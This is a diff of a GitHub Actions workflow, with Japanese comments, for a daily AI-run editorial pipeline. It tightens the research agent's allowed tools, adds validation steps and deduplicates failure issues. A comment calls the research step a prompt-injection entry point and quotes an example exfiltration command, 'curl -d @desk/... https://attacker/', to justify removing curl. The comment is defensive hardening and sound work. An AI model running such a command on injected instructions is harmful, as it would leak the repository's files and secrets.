@@ -12,7 +12,10 @@ concurrency:
 jobs:
   issue:
     runs-on: ubuntu-latest
-    timeout-minutes: 45
+    # claude-code-actionが最大9回(4b/8b含む)+ Places検索 + URL実測が走る。
+    # ジョブがタイムアウトすると always() を付けた desk/ の保存ごと殺され、
+    # 落ちた号のデバッグ材料が丸ごと消えるため余裕を持たせる
+    timeout-minutes: 90
     permissions:
       contents: write
       id-token: write
@@ -42,7 +45,10 @@ jobs:
           claude_args: "--model claude-sonnet-5 --allowedTools Read,Write,Edit,Glob,Grep"
 
       - name: 工程1 検品
-        run: jq -e '.title and .genres' "desk/vol-${{ steps.seed.outputs.nnn }}/01_kikaku.json"
+        uses: ./.github/actions/kenpin
+        with:
+          kind: kikaku
+          path: desk/vol-${{ steps.seed.outputs.nnn }}/01_kikaku.json
 
       - name: 工程2 リサーチ(researcher)
         uses: anthropics/claude-code-action@v1
@@ -54,18 +60,26 @@ jobs:
           prompt: >-
             vol.${{ steps.seed.outputs.vol }} の候補を集めて。
             desk/vol-${{ steps.seed.outputs.nnn }}/01_kikaku.json の発注に従うこと。
+            NDL/openBD/iTunesの取得には scripts/api_fetch.py を使うこと(curlは使えない)。
             URL検証には scripts/verify_links.py を使うこと。
             cafe/restaurant/architectureのPlaces検索には scripts/places_search.py を使うこと。
             出力は desk/vol-${{ steps.seed.outputs.nnn }}/02_kouho.json へ。
-          # リサーチのみBashが必要(API取得と検証スクリプト)。外部データがコンテキストに入る工程のため
-          # コマンドパターンで最小化する。
+          # リサーチのみBashが必要(API取得と検証スクリプト)。外部データがコンテキストに入る
+          # 唯一の工程 = プロンプトインジェクションの入口であり、かつSecretがenvに載る工程なので
+          # 許可はスクリプト3本に限る。
+          # `Bash(curl *)` は置かない —— curlは任意ホストへ任意のボディを送れるため
+          # (`curl -d @desk/... https://attacker/`)、注入されたレスポンスから外部送信の経路になる。
+          # キー不要のAPI取得は api_fetch.py(GET・許可ホストのみ・ボディ無し)へ寄せた。
           # Places APIは places_search.py 経由に限る —— curlで叩くとキーの受け渡しに
           # `$GOOGLE_PLACES_API_KEY` が必要になり、シェル展開を含むコマンドは静的検証できないため
           # このパターン照合が拒否する(vol.006のcafe全滅の原因)。キーはスクリプトが環境変数から直接読む
-          claude_args: '--model claude-sonnet-5 --allowedTools "Bash(curl *),Bash(python scripts/verify_links.py *),Bash(python3 scripts/verify_links.py *),Bash(python scripts/places_search.py *),Bash(python3 scripts/places_search.py *),Read,Write,Edit,Glob,Grep"'
+          claude_args: '--model claude-sonnet-5 --allowedTools "Bash(python scripts/api_fetch.py *),Bash(python3 scripts/api_fetch.py *),Bash(python scripts/verify_links.py *),Bash(python3 scripts/verify_links.py *),Bash(python scripts/places_search.py *),Bash(python3 scripts/places_search.py *),Read,Write,Edit,Glob,Grep"'
 
       - name: 工程2 検品
-        run: jq -e '.genres | length > 0' "desk/vol-${{ steps.seed.outputs.nnn }}/02_kouho.json"
+        uses: ./.github/actions/kenpin
+        with:
+          kind: kouho
+          path: desk/vol-${{ steps.seed.outputs.nnn }}/02_kouho.json
 
       - name: 工程3 執筆(genre-editor)
         uses: anthropics/claude-code-action@v1
@@ -79,7 +93,10 @@ jobs:
           claude_args: "--model claude-sonnet-5 --allowedTools Read,Write,Edit,Glob,Grep"
 
       - name: 工程3 検品
-        run: jq -e '.issue and (.items | length > 0)' "desk/vol-${{ steps.seed.outputs.nnn }}/03_genko.json"
+        uses: ./.github/actions/kenpin
+        with:
+          kind: genko
+          path: desk/vol-${{ steps.seed.outputs.nnn }}/03_genko.json
 
       - name: 工程4 校閲(koetsu)
         uses: anthropics/claude-code-action@v1
@@ -115,6 +132,13 @@ jobs:
             desk/vol-${{ steps.seed.outputs.nnn }}/03_genko.json を更新すること。
           claude_args: "--model claude-sonnet-5 --allowedTools Read,Write,Edit,Glob,Grep"
 
+      - name: 工程4b 検品(改稿は検品済みの03を上書きするため再検査する)
+        if: steps.koetsu_check.outputs.verdict == 'fix_required'
+        uses: ./.github/actions/kenpin
+        with:
+          kind: genko
+          path: desk/vol-${{ steps.seed.outputs.nnn }}/03_genko.json
+
       - name: 工程5 リンク加工(スクリプト)
         # RAKUTEN_AFF_PARAM は未契約のため意図的に未設定(sponsored判定とPR表記のみ行われ、IDは付与されない)。
         # 契約後は env: でSecretから渡す。公開URLに載る設計値のためSecretsスキャン対象には加えないこと
@@ -135,9 +159,10 @@ jobs:
           claude_args: "--model claude-sonnet-5 --allowedTools Read,Write,Edit,Glob,Grep"
 
       - name: 工程6 検品
-        run: |
-          test -s "desk/vol-${{ steps.seed.outputs.nnn }}/gera.html"
-          ! grep -qi "<script" "desk/vol-${{ steps.seed.outputs.nnn }}/gera.html"
+        uses: ./.github/actions/kenpin
+        with:
+          kind: gera
+          path: desk/vol-${{ steps.seed.outputs.nnn }}/gera.html
 
       - name: 工程7 機械校正(スクリプト・URL実測)
         env:
@@ -161,7 +186,10 @@ jobs:
           claude_args: "--model claude-sonnet-5 --allowedTools Read,Write,Edit,Glob,Grep"
 
       - name: 工程7 検品
-        run: jq -e '.machine' "desk/vol-${{ steps.seed.outputs.nnn }}/06_kousei.json"
+        uses: ./.github/actions/kenpin
+        with:
+          kind: kousei
+          path: desk/vol-${{ steps.seed.outputs.nnn }}/06_kousei.json
 
       - name: 工程8 校了(editor-in-chief)
         uses: anthropics/claude-code-action@v1
@@ -197,6 +225,13 @@ jobs:
             desk/vol-${{ steps.seed.outputs.nnn }}/gera.html に適用すること。
           claude_args: "--model claude-sonnet-5 --allowedTools Read,Write,Edit,Glob,Grep"
 
+      - name: 工程8b 検品(責了対応は検品済みのゲラを上書きするため再検査する)
+        if: steps.kouryou_check.outputs.hantei == '責了'
+        uses: ./.github/actions/kenpin
+        with:
+          kind: gera
+          path: desk/vol-${{ steps.seed.outputs.nnn }}/gera.html
+
       - name: 工程9 発行(スクリプト)
         if: steps.kouryou_check.outputs.hantei != '休刊'
         run: python scripts/publish.py "${{ steps.seed.outputs.vol }}"
@@ -209,14 +244,26 @@ jobs:
           riyu=$(jq -r '.riyu // "理由未記載"' "desk/vol-${{ steps.seed.outputs.nnn }}/07_kouryou.json")
           gh issue create --title "休刊: vol.${{ steps.seed.outputs.vol }} ($(TZ=Asia/Tokyo date +%F))" --body "$riyu"
 
-      - name: 工程失敗Issueを起票
+      - name: 工程失敗Issueを起票(オープンな同件があればコメント追記)
         if: failure()
         env:
           GH_TOKEN: ${{ github.token }}
-        run: >-
-          gh issue create
-          --title "工程失敗: vol.${{ steps.seed.outputs.vol || '?' }} ($(TZ=Asia/Tokyo date +%F))"
-          --body "daily-issue ワークフローが失敗した。ログ: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}"
+          VOL: ${{ steps.seed.outputs.vol || '?' }}
+          RUN_URL: ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
+        run: |
+          set -euo pipefail
+          # タイトルに日付を入れない —— 同じ原因で連日コケたときに1件へ集約するためである。
+          # 直した人がcloseし、次に落ちたらそこで新しい1件が立つ
+          title="工程失敗: daily-issue"
+          body="vol.${VOL}($(TZ=Asia/Tokyo date +%F))で失敗した。ログ: ${RUN_URL}"
+          number=$(gh issue list --state open --limit 100 --json number,title \
+            | jq -r --arg t "$title" 'map(select(.title == $t)) | .[0].number // empty')
+          if [ -n "$number" ]; then
+            echo "既存の #${number} へ追記する"
+            gh issue comment "$number" --body "$body"
+          else
+            gh issue create --title "$title" --body "$body"
+          fi
 
       - name: Secretsスキャン(desk/editorial/issues にキーが混入していないか検査)
         id: secrets_scan
